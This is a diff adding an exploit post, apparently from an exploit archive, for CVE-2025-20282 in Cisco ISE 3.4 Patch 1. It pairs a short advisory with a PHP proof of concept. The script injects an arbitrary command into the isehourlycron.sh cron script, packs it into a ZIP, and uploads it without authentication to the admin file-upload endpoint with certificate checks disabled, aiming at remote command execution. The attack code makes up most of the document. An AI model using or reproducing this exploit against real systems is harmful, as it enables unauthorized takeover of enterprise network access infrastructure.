@@ -1,0 +1,125 @@
+=============================================================================================================================================
+| # Title     : Cisco ISE 3.4 Patch 1 Unauthenticated Arbitrary File Upload via ZIP Injection                                               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.cisco.com                                                                                                      |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/210756/ & CVE-2025-20282
+
+[+] Summary    : An unauthenticated file upload vulnerability was identified in the administrative file upload endpoint. 
+                 The application accepts ZIP archives without authenticationand extracts files into sensitive execution paths.
+                 An attacker can craft a ZIP archive containing a modified cron shell script
+                 and upload it to the vulnerable endpoint, leading to arbitrary command execution.
+
+[+] Impact:
+
+- Remote Command Execution
+- Privilege Escalation
+- Full System Compromise
+
+[+] Attack Vector:
+
+Remote / Network
+
+[+] PoC : php poc.php --ip 192.168.1.100 --command "malicious_command_here"
+
+<?php
+
+if (php_sapi_name() !== 'cli') {
+    die("This script must be run from CLI only.\n");
+}
+
+/* ---------------- Argument Parsing ---------------- */
+
+$options = getopt("", ["reset", "command:", "ip:"]);
+
+if (!isset($options['command']) || !isset($options['ip'])) {
+    echo "Usage: php poc.php --command=\"<cmd>\" --ip=\"<target>\" [--reset]\n";
+    exit(1);
+}
+
+$COMMAND = $options['command'];
+$IP      = $options['ip'];
+$RESET   = isset($options['reset']);
+
+/* ---------------- Original Encoded Payload ---------------- */
+
+/**
+ * Original file under /opt/CSCOcpm/bin/
+ * Filename: isehourlycron.sh
+ */
+$isehourlycron = "++++++"; // Base64 placeholder
+
+$decoded_data = base64_decode($isehourlycron);
+
+/* ---------------- File System Setup ---------------- */
+
+$binDir = __DIR__ . "/bin";
+if (!is_dir($binDir)) {
+    mkdir($binDir, 0755, true);
+}
+
+$filePath = $binDir . "/isehourlycron.sh";
+
+/* ---------------- Write Logic ---------------- */
+
+$fileHandle = fopen($filePath, "w");
+fwrite($fileHandle, $decoded_data);
+
+if ($RESET) {
+    echo "[+] File has been reset\n";
+} else {
+    fwrite($fileHandle, $COMMAND);
+}
+
+fclose($fileHandle);
+
+/* ---------------- ZIP Creation ---------------- */
+
+$zipFile = __DIR__ . "/output.zip";
+$zip = new ZipArchive();
+
+if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
+    die("[-] Cannot create zip archive\n");
+}
+
+$files = new RecursiveIteratorIterator(
+    new RecursiveDirectoryIterator($binDir),
+    RecursiveIteratorIterator::LEAVES_ONLY
+);
+
+foreach ($files as $name => $file) {
+    if (!$file->isDir()) {
+        $filePath = $file->getRealPath();
+        $relativePath = substr($filePath, strlen(__DIR__) + 1);
+        $zip->addFile($filePath, $relativePath);
+    }
+}
+
+$zip->close();
+
+/* ---------------- Upload via cURL ---------------- */
+
+echo "[*] Uploading file unauthenticated...\n";
+
+$ch = curl_init();
+curl_setopt_array($ch, [
+    CURLOPT_URL            => "https://" . $IP . "/admin/files-upload/",
+    CURLOPT_POST           => true,
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_SSL_VERIFYHOST => false,
+    CURLOPT_POSTFIELDS     => [
+        'file' => new CURLFile($zipFile)
+    ]
+]);
+
+$response = curl_exec($ch);
+curl_close($ch);
+
+echo "[+] Upload completed\n";
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
